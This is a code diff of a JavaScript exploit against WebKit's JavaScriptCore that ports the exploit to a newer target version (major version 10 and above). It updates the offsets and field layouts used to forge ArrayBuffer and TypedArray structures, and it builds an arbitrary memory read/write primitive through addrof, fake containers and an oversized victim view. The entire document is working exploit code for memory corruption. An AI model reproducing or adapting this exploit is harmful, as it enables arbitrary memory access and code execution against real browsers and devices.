@@ -857,7 +857,13 @@ ArrayBuffer.from = function (addr, len = -1) {
 
   arw.view(m_impl).setBigUint64(0, 2n, true); // DeferrableRefCountedBase::m_refCount
   arw.view(m_impl).setBigUint64(0x10, addr, true); // m_contents.m_data
-  arw.view(m_impl).setInt32(0x24, len, true); // m_contents.m_sizeInBytes
+
+   // m_contents.m_sizeInBytes
+  if (version.major >= 10) {
+    arw.view(m_impl).setBigInt64(offsets.wk_ArrayBuffer_m_contents_m_sizeInBytes, BigInt(len), true);
+  } else {
+    arw.view(m_impl).setInt32(offsets.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
+  }
 
   return ab;
 };
@@ -1066,7 +1072,7 @@ async function init_arw() {
   const m_wrapper_m_ptr = rw.read8(m_wrapper + 8n);
   logger.debug(`m_wrapper_m_ptr: ${m_wrapper_m_ptr.hex()}`);
 
-  const m_backing = rw.read8(m_wrapper_m_ptr + 0x28n);
+  const m_backing = rw.read8(m_wrapper_m_ptr + BigInt(offsets.wk_FontFace_m_backing));
   logger.debug(`m_backing: ${m_backing.hex()}`);
 
   const props = [];
@@ -1113,7 +1119,7 @@ async function init_arw() {
   const font_addr = rw.read8(dummy_font_addr + 0x18n);
   logger.debug(`font_addr: ${font_addr.hex()}`);
 
-  const css_font_addr = rw.read8(font_addr + 0x28n);
+  const css_font_addr = rw.read8(font_addr + BigInt(offsets.wk_FontFace_m_backing));
   logger.debug(`css_font_addr: ${css_font_addr.hex()}`);
 
   const m_thread = rw.read8(css_font_addr + BigInt(offsets.wk_CSSFontFace_m_thread));
@@ -1178,9 +1184,15 @@ async function init_arw() {
   const container = {
     jscell: helper.to_float(dummy_view_jscell), // NaN-boxed, fix later
     butterfly: null, // becomes 0x2, fix later
-    vector: arw.victim,
-    length_and_flags: false, // becomes 0x6, fix later
+    vector: arw.victim
   };
+
+  if (version.major >= 10) {
+    container.length = false; // becomes 0x6, fix later
+    container.flags = null; // becomes 0x2, fix later
+  } else {
+    container.length_and_flags = false; // becomes 0x6, fix later
+  }
 
   const container_addr = rw.addrof(container);
   logger.debug(`container_addr: ${container_addr.hex()}`);
@@ -1197,7 +1209,13 @@ async function init_arw() {
   // Fix NaN-boxing values from earlier
   arw.victim.setBigUint64(0, dummy_view_jscell, true); // jscell
   arw.victim.setBigUint64(8, 0n, true); // butterfly
-  arw.victim.setUint32(0x1c, 1, true); // TypedArrayMode::OversizeTypedArray
+
+  // TypedArrayMode::OversizeTypedArray
+  if (version.major >= 10) {
+    arw.victim.setBigInt64(offsets.wk_TypedArray_flags, 1n, true); 
+  } else {
+    arw.victim.setUint32(offsets.wk_TypedArray_flags, 1, true);
+  }
 
   // Create new view as TypedArrayMode::WastefulTypedArray using fake.buffer that points to arw.victim and no longer depends on container's lifetime
   arw.master = new Uint32Array(fake.buffer);
@@ -1206,7 +1224,11 @@ async function init_arw() {
   logger.debug(`victim_addr: ${victim_addr.hex()}`);
 
   // Set arw.victim's length to max
-  arw.view(victim_addr).setInt32(0x18, -1, true);
+  if (version.major >= 10) {
+    arw.view(victim_addr).setBigInt64(0x18, -1n, true);
+  } else {
+    arw.view(victim_addr).setInt32(0x18, -1, true);
+  }
 
   // Cleanup container
   delete container.jscell;
